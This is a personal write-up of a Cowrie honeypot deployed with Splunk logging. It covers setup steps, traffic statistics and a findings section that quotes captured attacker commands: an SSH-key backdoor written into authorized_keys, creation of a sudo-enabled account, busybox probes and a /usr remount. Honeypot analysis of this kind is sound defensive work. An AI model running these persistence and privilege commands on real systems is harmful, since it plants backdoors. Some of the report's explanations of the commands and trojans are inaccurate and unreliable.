# Honeypot Cowrie Analysis

## 1. Introduction

The primary objective of this honeypot deployment is to identify and analyze malicious activities targeting the network. By attracting and monitoring attackers, we aim to gather valuable intelligence on adversaries' attack patterns, techniques, and tools. This information will enhance our network security measures and develop more effective defense strategies.

This report covers the deployment and monitoring of a high-interaction honeypot over a period of a week. The honeypot was placed within an isolated network to simulate vulnerable systems and attract potential attackers. The data collected during this period includes all incoming connections, attempted exploits, and captured malware samples.  By focusing on this specific timeframe and setup, we aim to provide a comprehensive analysis of the threats our network faces and recommend actionable security improvements

## 2. Methodology

Recommend using a Linux Machine/Virutal Machine

Setup

- Create two isolated ubuntu servers (Use Digital Ocean for server hosting)
    - One for the cowrie honeypot (1gb ram plan)
    - One for Splunk Enterprise (3 gb ram plan)
- Installing Honeypot
    - Firstly I recommend the following the cowrie documentation : [https://cowrie.readthedocs.io/en/latest/INSTALL.html#step-1-install-system-dependencies](https://cowrie.readthedocs.io/en/latest/INSTALL.html#step-1-install-system-dependencies)
    - Before installing the dependencies, do a **sudo apt update && upgrade**
    - Next, install the python3 virtual environment
        - Sudo apt install python3-venv
    - Then do: 
    `sudo apt-get install git python3-virtualenv libssl-dev libffi-dev build-essential libpython3-dev python3-minimal authbind virtualenv`
    - Create a user account that is separate from root to prevent any security risk
    `sudo adduser --disabled-password cowrie`
    - To switch users enter command: sudo su - cowrie
    - Do a git clone to retrieve the cowrie honeypot files from the GitHub repository 
    `git clone http://github.com/cowrie/cowrie`
    - Next, navigate to the **Cowrie** directory and do **ls** command to check out the files
    - The next set is to setup the virtual environment
        - Run pwd to see which directory you are in
            - Should be: home/cowrie/cowrie
        - Commands:
            - python3 - m venv cowrie-env
            - source cowrie-env/bin/activate
            - python3 -m pip install --upgrade pip
            - python3 -m pip install --upgrade -r requirements.txt
    - Then set up new the configuration file
        - Run cp etc/cowrie.cfg.dist etc/cowrie.cfg
            - This is to allow
        - Navigate to etc directory and do nano cowrie.cfg
            - Change the server name to something that seems real
                - Example: “ubuntu_server06”
            - Then do ctrl+w and search for “[telnet]” and set “enabled” variable to “true”
    - After this you could now set splunk for your honeypot
- Splunk Enterprise installation
    - One the Splunk server mkdir new directory in splunk
        - sudo mkdir /home/splunk
        - sudo chown splunk:splunk /home/splunk
    - Navigate to the Splunk Directory
        - Switch to the ‘/home/splunk’ directory:
            - cd /home/splunk
    - Firstly claim the free trial from this link: https://www.splunk.com/en_us/download/splunk-enterprise.html
    - Once setting up your account, install Splunk via wget. Use the .deb file before installing it. Make sure to switch to the Splunk user.
    
    ![Untitled](Untitled.png)
    
    - Command: wget -O splunk-9.2.1-78803f08aabb-linux-2.6-amd64.deb "[https://download.splunk.com/products/splunk/releases/9.2.1/linux/splunk-9.2.1-78803f08aabb-linux-2.6-amd64.deb](https://download.splunk.com/products/splunk/releases/9.2.1/linux/splunk-9.2.1-78803f08aabb-linux-2.6-amd64.deb)"
    - sudo dpkg -i <thesplunkinstallation file>
    - Once the installation is installed got /opt/splunk/bin
        - Then do “sudo ./splunk start
            - Go through the licensing
    - After that enable boot-start
        - sudo ./splunk enable boot-start
- Splunk HTTP Event Collector setup
    - Go to S**ettings → Add data → Monitor → HTTP Event Collector**
        - Give it a name and make sure **Enable indexer acknowledgement** is unchecked
        - Source type = Automatic
        - For the index create a new index called **cowrie** and select the item
        - Then, a token should be generated, which will be used in the cowrie.cfg file
    - Go to **Settings → Data Inputs → Global Settings**
        - Enable SSL
        - Set HTTP Port to 8080
- Cowrie Splunk Config Setup
    - Navigate to cowrie.cfg file
    - Once there do ctrl+w and enter “[output_splunk]”
        - Enable it
        - Edit the token and URL variable
            - Put the token that you generated from splunk
            - Replace [localhost](http://localhost) with your splunk server IP

## 3. Data Analysis

Traffic Overview: 

Captured over 380738 connections with 4078 unique IP addresses. 11,374 login successes and 15,295 Failed logins by the attackers. The majority of the connection access was through SSH with 24,538 connections and 4,611 connection access through Telnet. There were a few rarities of connections such as using ports 443, 587, 80.  Between the time ranges of 06/13/2024 - 06/19/2024 the day with the most logs was 06/19/2024. 

## 4. Findings

After looking through the event logs the most used hash was “a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2” which is a **Backdoor OpenSSH public key** to access the ubuntu server. The most connection access based on countries were China, US, India, Russia, and Japan. China had more than 150k connections which is more the other US, India, Russia and Japan combined. 

The most used Source IP was 112.90.182.230, with 60.8% usage with port 23456 being used the most. After a bit of research, port 23456 is used for Trojans/backdoors. The three types of trojans are Evil FTP, Ugly FTP, and WhackJob. Evil FTP refers to malicious FTP servers or clients used by attackers to transfer files illicitly. "Evil FTP" could be employed in cyber attacks to exfiltrate data from compromised systems or to distribute malware. Ugly FTP refers to poorly implemented or insecure FTP servers or clients that have vulnerabilities. "Ugly FTP" might not follow best practices for security, making them easy targets for exploitation. WhackJob refers to an unconventional or erratic tool or method used in file transfers or cyber attacks. It might indicate something irregular or unorthodox in how files are handled or transferred.

Here are the inputs contained in the hash 

```bash
cd ~ && rm -rf .ssh && mkdir .ssh && echo 
"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5
O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9e
LBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQH
md1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5Pm
Uux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && 
chmod -R go= ~/.ssh && cd ~

cd ~; chattr -ia .ssh; lockr -ia .ssh

lockr -ia .ssh
```

- The first command: The script sets up an SSH key for passwordless login by adding it to the `authorized_keys` file. Then, it ensures the ‘**.ssh”** directory is secured by adjusting permissions and possibly changing file attributes to prevent unauthorized modifications.
- The second command: navigates to the root directory, then `chattr -ia .ssh` removes both the immutable and append-only attributes from the `.ssh` directory, allowing for modifications to its contents, such as adding or deleting files within it. The third part of the command uses locker, which is an SSH key management program.    `lockr -ia .ssh`

---

```bash
busybox dd if=$SHELL bs=22 count=1||dd if=/proc/self/exe bs=22 count=1||
while read i;do busybox echo -n $i;done</proc/self/exe||cat /proc/self/exe
```

Attackers use this command to read outputs and copy them to the “/proc/self/exe” directory by trying multiple commands, hence the use of “OR” for fallback methods. 

Usually, attackers pair this command with scripts to ensure their malware/payload could retrieve part of its binary data, even if the data is restricted or monitored.

---

```bash
apt update && apt install sudo curl -y && sudo useradd -m -p 
$(openssl passwd -1 2wnwKBvm) system && sudo usermod -aG sudo system
```

Based on these commands, the attacker seemed to have tried to create a new user and give it administrative privileges. 

---

```bash
ps | grep '[Mm]iner'
ps -ef | grep '[Mm]iner'
```

The attacker tried to look for crypto miners to possibly cryptojack it. Botnet mostly runs these commands. 

---

```bash
mount -o remount,rw,exec /usr/; 
>/usr/.a && cd /usr/;
(/bin/busybox echo -e "\x44\x49\x52"||echo -e "\x44\x49\x52")
```

The attacker tries to remount the /usr/ directory with read-write and execute privileges. This could be to access the directory and output data from it. In addition, the attacker tries to execute shell command with use of “\x44\x49\x52\” which translates to DIR from Hex. This could be for data manipulation or Exfiltration to modify and retrieve files from the usr directory. 

Many commands similar to this tried to manipulate Data, Exfiltrate Data, or persist data on different directories on the server.  

---

The top 5 most used passwords were:

| **Top 5 Passwords** | **Count** | **%** |
| --- | --- | --- |
| 3245gs5662d34 | 1,112 | 4.17% |
| 345gs5662d34 | 1,110 | 4.162% |
| 123456 | 838 | 3.142% |
| admin | 554 | 2.077% |
| xc3511 | 384 | 1.44% |

## 5. Recommendations

Restrict access for connections based on geographical location. For example, China, India, and Russia should be excluded to minimize potential attacks. Create strong passwords to prevent unauthorized access. Create firewall rules to disable unused ports and domains not used within the organization. Ensure that high-level admin privileges are limited for a single user and that file integrity and permissions are managed correctly. Constant monitoring of the server is done to find any suspicious activity, and this could include employing Intrusion Detection System to detect suspicious activity.